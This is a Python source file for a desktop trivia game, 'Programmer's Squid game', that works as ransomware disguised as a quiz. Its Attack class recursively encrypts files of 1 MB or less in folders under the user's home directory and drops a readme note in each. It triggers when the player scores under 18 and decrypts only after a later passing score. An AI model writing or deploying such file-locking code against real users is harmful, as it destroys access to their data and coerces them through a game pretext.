import json
import os
import logging
import customtkinter as ctk

from cryptography.fernet import Fernet
from tkinter import PhotoImage


########## Welcome to Programmer's Squid game ##########
# welcome_text = pyfiglet.figlet_format(" Programmer's Squid game.")
welcome_text = "Programmer's Squid game"
# Load data
with open("data/data.json", "r") as f:
    data = json.load(f)

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

class Attack:
    
    def __init__(self):
        self.key = None
        self.files = set()

    def list_files(self, directory):
        """
        Recursively lists all files in a given directory, excluding specific files.
        Args:
            directory (str): The directory path to list files from.
        Returns:
            None
        Raises:
            Exception: If an error occurs during directory listing.
        """

        try:
            logging.info(f"{directory}")
            for file in os.listdir(directory):
                logging.info(f"{file}")
                path = os.path.join(directory, file)
                if os.path.isdir(path):
                    self.list_files(path)
                elif os.path.isfile(path):
                    if file not in ["readme.txt", "thekey.key"]:
                        if os.path.getsize(path) <= 1048576:
                            self.files.add(path)
                
        except Exception:
            logging.exception(f"Error listing files in directory {directory}")
            pass

    def generate_key(self):
        """
        Generates a new encryption key using Fernet, stores it in the instance variable `self.key`,
        and saves it to a JSON file named 'data.json'.
        The generated key is also added to the `data` dictionary with the key "key".
        Raises:
            IOError: If there is an error writing to 'data.json'.
        """

        logging.info("Generating key...")
        self.key = Fernet.generate_key()
        logging.info(f"{self.key}")
        data["key"] = str(self.key)
        with open('data/data.json', 'w') as file:
            json.dump(data, file, indent=4)

    def encrypt_files(self, frame = None, master=None):
        """
        Encrypts files in specified folders and creates a readme file in each folder.
        This method performs the following steps:
        1. Generates an encryption key.
        2. Lists all files in the specified folders.
        3. Encrypts each file using the generated key.
        4. Creates a readme file in each folder with specified content.
        Attributes:
            self.key (bytes): The encryption key generated by the generate_key method.
            self.files (list): A list of files to be encrypted.
        Raises:
            Exception: If an error occurs during file encryption or readme file creation.
        """

        # Generate a key
        self.generate_key()

        # List all the files in the folders
        for folder in data["folders"]:
            self.list_files(os.path.join(os.path.expanduser("~"), folder))
        logging.info(f"{len(self.files)} files found.")

        # Encrypt the files
        for index, file in enumerate(self.files):
            logging.info(f"Encrypting file: {file}")
            try:
                with open(file, "rb") as f:
                    contents = f.read()
                    contents_encrypted = Fernet(self.key).encrypt(contents)
                with open(file, "wb") as f:
                    f.write(contents_encrypted)
                logging.info("File encrypted successfully.")
            except Exception:
                logging(f"Error encrypting file {file}")
                continue
            
            # Update the progress bar
            if frame:
                progress = (index + 1) / len(self.files)
                frame.progressbar.set(progress)
                master.update_idletasks()
            if index+1 == len(self.files):
                frame.summary.configure(text="All done!", font=ctk.CTkFont(size=20), text_color="green")
                frame.next_button.grid(padx=20, pady=(0, 40), sticky="n")
                frame.next_button.configure(
                    command=lambda: master.show_frame(
                        frame,
                        master.notice_screen, 
                        title="You have been attacked by ransomware!", 
                        summary=f"Affected folders: {', '.join(data['folders'])}.\n\nThis is due to not scoring the desired score of 18. Your files will stay encrypted until you play the game again and achieve the required marks. Do not tamper with the files in the affected folders as they might not be able to be decrypted. For more information, read the 'readme.txt' file in the affected folders."
                    )
                )

        # Create a readme file in each folder
        for path in data["folders"]:
            try:
                with open(os.path.expanduser("~") + "/" + path + "/" + "readme.txt", "w") as f:
                    f.write(data["readme_context"])
                logging.info(f"Creating readme file in {os.path.expanduser("~") + path}")
            except Exception:
                logging.exception("Error creating readme file")
                continue
    
    def decrypt_files(self, frame=None, master=None):
        """
        Decrypts files in specified folders using a provided key.
        This method performs the following steps:
        1. Reads the encryption key from the data dictionary.
        2. Lists all files in the specified folders.
        3. Decrypts each file using the provided key.
        4. Removes the readme file and the key file from each folder.
        Raises:
            Exception: If an error occurs during file decryption or file removal.
        Note:
            The key and folders are expected to be provided in the `data` dictionary.
        """

        # Read the key file
        key = bytes(data["key"][2:-1], "utf-8")

        # List all the files in the folders
        for folder in data["folders"]:
            self.list_files(os.path.join(os.path.expanduser("~"), folder))

        # Decrypt the files
        for index, file in enumerate(self.files):
            logging.info(f"Decrypting file: {file}")
            try:
                with open(file, "rb") as f:
                    contents = f.read()
                    contents_decrypted = Fernet(key).decrypt(contents)
                with open(file, "wb") as f:
                    f.write(contents_decrypted)
                logging.info("File decrypted successfully.")
            except Exception:
                logging.exception(f"Error decrypting file {file}")
                continue
            if frame:
                progress = (index + 1) / len(self.files)
                frame.progressbar.set(progress)
                master.update_idletasks()
            if index+1 == len(self.files):
                frame.summary.configure(text="All done!", font=ctk.CTkFont(size=20), text_color="green", justify="center")
                frame.next_button.grid(padx=20, pady=(0, 40), sticky="n")
                frame.next_button.configure(
                    command=lambda: master.show_frame(
                        frame, 
                        master.notice_screen, 
                        title="Files Decrypted Successfully!", 
                        summary="Congratulations! You have achieved the desired score. Your files have been decrypted successfully."
                    )
                )
        # Remove the readme file and the key file
        for path in data["folders"]:
            try:
                os.remove(os.path.expanduser("~") + "/" + path + "/" + "readme.txt")
                logging.info(f"Removing readme file in {path}")
            except Exception:
                logging.exception("Error removing readme file")
                continue
            try:
                data["key"] = None
                with open('data/data.json', 'w') as file:
                    json.dump(data, file, indent=4)
                logging.info("Deleting key...")
            except Exception:
                logging.exception("Error removing key")
                continue

class WelcomeFrame(ctk.CTkFrame):
    def __init__(self, master, **kwargs):
        super().__init__(master,**kwargs)

        self.welcome_label = ctk.CTkLabel(self, text=welcome_text, width=200, height=100, font=ctk.CTkFont("Times", 40, 'bold'), justify="center", wraplength=500)
        self.welcome_label.grid(row=0, column=0, padx=40, pady=(10, 10), sticky="s")

        self.continue_button = ctk.CTkButton(self, text="Continue", command=lambda: master.show_frame(self, master.trivia_screen), font=ctk.CTkFont(size=20, weight="bold"), height=60, width=160)
        self.continue_button.grid(row=2, column=0, padx=20, pady=(0, 40), sticky="n")

        self.grid_rowconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)
        self.grid_columnconfigure(0, weight=1)


class LoaderScreen(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.grid_rowconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)
        self.grid_columnconfigure(0, weight=1)

        self.title = ctk.CTkLabel(self, font=ctk.CTkFont(size=30))
        self.title.grid(row=0)

        self.progressbar = ctk.CTkProgressBar(self, orientation="horizontal")
        self.progressbar.grid(row=1, padx=50, pady=(0, 0), sticky="ew")

        self.summary = ctk.CTkLabel(self, font=ctk.CTkFont(size=15), wraplength=500)
        self.summary.grid(pady=(0, 80), sticky="nsew")

        self.next_button = ctk.CTkButton(self, text="Continue", font=ctk.CTkFont(size=15, weight="bold"), height=50, width=150)

    def update_args(self, **kwargs):
        self.title.configure(text=kwargs.get("title", None))
        self.summary.configure(text=kwargs.get("summary", None))


class RadioButtonFrame(ctk.CTkFrame):
    def __init__(self, master, values, **kwargs):
        super().__init__(master)

        self.grid_columnconfigure(0, weight=1)
        self.values = values
        self.variable = ctk.StringVar(value="")
        self.buttons = []

        for i, value in enumerate(self.values):
            radiobutton = ctk.CTkRadioButton(self, text=self.values[value], variable=self.variable, value=value, height=50, font=ctk.CTkFont(size=18))
            radiobutton.grid(row=i, column=0, padx=10, pady=(10, 0), sticky="ew")
            self.buttons.append(radiobutton)


    def update_options(self, options):
        for button in self.buttons:
            button.destroy()
        self.buttons = []
        for i, value in enumerate(options):
            radiobutton = ctk.CTkRadioButton(self, text=options[value], variable=self.variable, value=value, height=50, font=ctk.CTkFont(size=18))
            radiobutton.grid(row=i, column=0, padx=10, pady=(10, 0), sticky="ew")
            self.set("")
            self.buttons.append(radiobutton)

    def get(self):
        return self.variable.get()
    
    def set(self, value):
        self.variable.set(value)

class TriviaFrame(ctk.CTkFrame):
    def __init__(self, master, data):
        super().__init__(master)

        self.master = master

        self.grid_rowconfigure(0, weight=1)
        self.grid_rowconfigure(1, weight=1)
        self.grid_columnconfigure(0, weight=1)

        self.score = 20
        self._data = data
        self._qtn_num = 1

        self.scores = ctk.CTkLabel(self, text=f"Score: {self.score}", font=ctk.CTkFont(size=22))
        self.scores.grid(row=0, column=0, padx=10, pady=(10, 0), sticky="sew")

        self.progress_text = ctk.CTkLabel(self, text=f"{self._qtn_num}/{len(self._data)}", font=ctk.CTkFont(size=15))
        self.progress_text.grid(row=1, sticky="sew")

        self.progressbar = ctk.CTkProgressBar(self, orientation="horizontal")
        self.progressbar.grid(row= 2, column=0, padx=20, pady=(0, 20), sticky="ew")
        progress = (self._qtn_num) / len(self._data)
        self.progressbar.set(progress)

        self.question = ctk.CTkLabel(self, text=self._data[str(self._qtn_num)]["question"], font=ctk.CTkFont(size=16), wraplength=300)
        self.question.grid(row=3, column=0, padx=10, pady=(10, 0), sticky="nsew")

        self.options = RadioButtonFrame(self, self._data[str(self._qtn_num)]["answers"], height=400)
        self.options.grid(row=4, column=0, padx=20, pady=(10, 20), sticky="ns")

        self.feedback_label = ctk.CTkLabel(self, text=None, text_color="green")
        self.feedback_label.grid(row=5, column=0, sticky="new")

        self.submit_btn = ctk.CTkButton(self, text="Next", command=self.next_callback, font=ctk.CTkFont(size=20, weight="bold"), height=50, width=160)
        self.submit_btn.grid(row=6, column=0, padx=20, pady=(10, 20), sticky="n")

    def next_callback(self):
        if self.options.get() == self._data[str(self._qtn_num)]["correct"]:
            self.score += 1
            self.feedback_label.configure(text="Correct!")
        else:
            self.feedback_label.configure(text="Wrong!", text_color="red")

        # check if the question number doesn't exceed the length of the questions
        if self._qtn_num < len(self._data):
            self._qtn_num += 1
        else:
            if self.score < 18:
                if not data["key"]:
                    logging.info("You failed the game. You will be attacked by ransomware.")
                    logging.info("Your files will be encrypted.")
                    logging.info("Read the readme.txt file in each folder to get the instructions. eng Downloads and Documents folder")
                    frame = self.master.show_frame(self, self.master.loader_screen, title="OPPS", summary="Don't close the window as the application is solving issues with its file system, please give a bit time")  # Show the encrypt screen first
                    self.master.update_idletasks()  # Ensure the screen is updated
                    Attack().encrypt_files(frame, self.master)
                else:
                    logging.info("Your files will stay encrypted untill you get the wanted score.")
                    self.master.show_frame(
                        self,
                        self.master.notice_screen, 
                        title="Files Already Encrypted!", 
                        summary=(
                            f"Affected folders: {', '.join(data['folders'])}.\n\n"
                            "Your files are already encrypted due to not scoring the desired score of 18. "
                            "Please play the game again and achieve the required marks to decrypt your files. "
                            "Do not tamper with the files in the affected folders as they might not be able to be decrypted. "
                            "For more information, read the 'readme.txt' file in the affected folders."
                        )
                    )
            else:
                logging.info("You won the game. Congratulations!")
                logging.info("You will be rewarded with 1 million dollars.")
                if data["key"]:
                    frame = self.master.show_frame(self, self.master.loader_screen, title="Decrypting affected files.", summary="Please don't close the window or interfere with the affected files as this might conflict the decryption process.")  # Show the encrypt screen first
                    self.master.update_idletasks()  # Ensure the screen is updated
                    Attack().decrypt_files(frame, self.master)
                    logging.info("Your files have been decrypted.")
                else:
                    self.master.show_frame(
                        self,
                        self.master.notice_screen, 
                        title="Congratulations!", 
                        summary=(
                            "You have achieved the desired score and won the game! "
                            "Your files were never encrypted. "
                            "Enjoy your victory and the reward of 1 million dollars!"
                        )
                    )
        
        self.scores.configure(text=f"Score: {self.score}")
        self.progress_text.configure(text=f"{self._qtn_num}/{len(self._data)}")
        self.question.configure(text=self._data[str(self._qtn_num)]["question"], wraplength=self.winfo_width())
        self.options.update_options(self._data[str(self._qtn_num)]["answers"])

        progress = (self._qtn_num) / len(self._data)
        self.progressbar.set(progress)

        # You can add logic here to load the next question or end the quiz
        # For now, it just prints the selected answer
        # print(f"Selected answer: {self.radiobutton_frame.get()}")




class App(ctk.CTk):
    def __init__(self, **kwargs): 
        super().__init__()

        self.title("Programmer's Squid game")
        self.geometry("600x600")
        self.grid_rowconfigure(0, weight=1)  # configure grid system
        self.grid_columnconfigure(0, weight=1)
        icon = PhotoImage(file="data/thinking.png")
        self.iconphoto(False, icon)

        self.welcome_screen = WelcomeFrame(self)
        self.trivia_screen = TriviaFrame(self, data["questions"])
        self.loader_screen = LoaderScreen(self)

        self.notice_screen = LoaderScreen(self)
        self.notice_screen.progressbar.grid_forget()
        self.notice_screen.next_button.grid(padx=20, pady=(0, 40), sticky="n")
        self.notice_screen.next_button.configure(command=lambda: self.show_frame(self.notice_screen, self.trivia_screen))
        self.notice_screen.next_button.configure(text="Play Again")

        self.show_frame(None, self.welcome_screen)

    def show_frame(self, forget_frame, frame, **kwargs):
        logging.info(f"Changing frame to {frame}")
        if forget_frame:
            forget_frame.grid_forget()

        self.reset()
        if kwargs:
            frame.update_args(**kwargs)
        frame.grid(row=0, column=0, padx=0, pady=0, sticky="nsew")
        return frame
    
    def reset(self):
        self.welcome_screen = WelcomeFrame(self)
        self.trivia_screen = TriviaFrame(self, data["questions"])
        self.loader_screen = LoaderScreen(self)

        self.notice_screen = LoaderScreen(self)
        self.notice_screen.progressbar.grid_forget()
        self.notice_screen.next_button.grid(padx=20, pady=(0, 40), sticky="n")
        self.notice_screen.next_button.configure(command=lambda: self.show_frame(self.notice_screen, self.trivia_screen))
        self.notice_screen.next_button.configure(text="Play Again")



if __name__ == "__main__":
    logging.basicConfig(
    filename="data/squidgamelog.log",
    encoding="utf-8",
    filemode="a",
    format="{asctime} - {levelname} - {message}",
    style="{",
    datefmt="%Y-%m-%d %H:%M",
    level=logging.INFO
)

    logging.info("Starting Application...")
    app = App()
    app.mainloop()
    logging.info("Closing Application")